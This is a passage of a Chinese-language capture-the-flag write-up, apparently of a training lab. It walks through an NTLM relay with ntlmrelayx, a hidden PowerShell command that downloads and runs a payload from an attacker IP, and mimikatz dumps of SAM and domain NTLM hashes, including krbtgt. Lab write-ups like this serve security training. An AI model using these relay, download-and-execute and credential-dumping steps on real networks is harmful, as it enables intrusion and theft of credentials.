3. 开启ntlmrelayx
```
proxychains python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t smb://10.200.114.30 -smb2support --no-http-server 
```

4. 在filesrv01触发NTLM认证

```
beacon> run dir \\10.200.114.35\blah
[*] Tasked beacon to run: dir \\10.200.114.35\blah
[+] host called home, sent: 153 bytes
[-] could not spawn dir \\10.200.114.35\blah (token): 2
```

5. 收到NTML认证的哈希流量

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659854255296.png)

看到有Administrator的哈希

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:70017854acf6ea8d2af520eddcc866fb:::
```

但是这里的哈希试过不能pth，于是我决定换一个方法，当中继发生时执行一条命令，使用```-c```参数,此时我们收到一个system的beacon

```
proxychains python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t smb://10.200.114.30 -smb2support --no-http-server -c 'powershell -nop -w hidden -c "iex (new-object net.webclient).downloadstring(\"http://10.50.111.108/a\")"'
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659858729357.png)


拿到root.txt


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659858952513.png)

**Task 46  NTLM Relay Now you see me, now you don't**

> What host has SMB signing disabled?

> DC-SRV01


# 后渗透

使用mimikatz导出sam里的哈希,与我们relay时收到的哈希是一致的
```
beacon> mimikatz lsadump::sam
[*] Tasked beacon to run mimikatz's lsadump::sam command
[+] host called home, sent: 750702 bytes
[+] received output:
Domain : DC-SRV01
SysKey : 739c5b5f17a8c2bbeb4ddd207a90710e
Local SID : S-1-5-21-1295596150-3325788684-427610580

SAMKey : 123125e678eaef2f588002dcd3d75067

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 70017854acf6ea8d2af520eddcc866fb

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
```

导出整个域的哈希

```
beacon> mimikatz lsadump::lsa /patch
[*] Tasked beacon to run mimikatz's lsadump::lsa /patch command
[+] host called home, sent: 750702 bytes
[+] received output:
Domain : HOLOLIVE / S-1-5-21-471847105-3603022926-1728018720

RID  : 000001f4 (500)
User : Administrator
LM   : 
NTLM : ae19656e1067231cb5e3c5dcea320bba

RID  : 000001f5 (501)
User : Guest
LM   : 
NTLM : 

RID  : 000001f6 (502)
User : krbtgt
LM   : 
NTLM : c6bcd5e68903ff375bf859fa045bd8de

RID  : 00000457 (1111)
User : ad-joiner
LM   : 
NTLM : c46a20057362e5dcc1af9678587063aa

RID  : 0000045a (1114)
User : spooks
LM   : 
NTLM : 17ee8530ccb9e99e82a8e5e61892c0f1

RID  : 0000045b (1115)
User : cryillic
LM   : 
NTLM : c75eb9819dcb9628d2abc407b7223b71

RID  : 0000045c (1116)
User : PC-MGR
LM   : 
NTLM : 12187dfef6090b810fcd76fcb3444898

RID  : 0000045f (1119)
User : SRV-ADMIN
LM   : 
NTLM : 4a3ff5120bbadf8f262e230faeb58b14

RID  : 00000462 (1122)
User : a-koronei
LM   : 
NTLM : 4b80bddae540da13e6a656791695457c

RID  : 00000466 (1126)
User : a-fubukis
LM   : 
NTLM : 556ffce954d95427381af02afe1f6587

RID  : 00000467 (1127)
User : koronei
LM   : 
NTLM : 1f3fd340240e4fd6d9cb489f27bfe49c

RID  : 00000468 (1128)
User : fubukis
LM   : 
NTLM : 723ac46f6bee2af009a8404485ef4aa8

RID  : 00000469 (1129)
User : matsurin
LM   : 
NTLM : cabfd4107a3bcdcb28f19b3449d9cf8a

RID  : 0000046a (1130)
User : mikos
LM   : 
NTLM : 320f3f40650fe8a46467ff259c310b67

RID  : 0000046b (1131)
User : okayun
LM   : 
NTLM : 470f765db33733309ea2e3919f327157

RID  : 0000046c (1132)
User : watamet
LM   : 
NTLM : d8d41e6cf762a8c77776a1843d4141c9

RID  : 0000046d (1133)
User : gurag
LM   : 
NTLM : 977f190bc133ce7397e7c48bd3295d9a

RID  : 0000046e (1134)
User : cocok
LM   : 
NTLM : 58c50535f91eb6762364a2ba007125bb

RID  : 0000046f (1135)
User : ameliaw
LM   : 
NTLM : a14a97d351ede243ac6bc576251e7786

RID  : 00000470 (1136)
User : WEB-MGR
LM   : 
NTLM : 0bb6e5639d87631dde65a959c193261f

RID  : 000003f0 (1008)
User : DC-SRV01$
LM   : 
NTLM : 7a70d7a4cbf7c4397ad9181414f582d9

RID  : 00000458 (1112)
User : S-SRV01$
LM   : 
NTLM : 3179c8ec65934b8d33ac9ec2a9d93400

RID  : 00000460 (1120)
User : PC-FILESRV01$
LM   : 
NTLM : eaf7acaf65e52060758676bc474cbc65

RID  : 00000472 (1138)
User : S-SRV02$
LM   : 
NTLM : 706a4bddf43649c6721356b220167083v
```

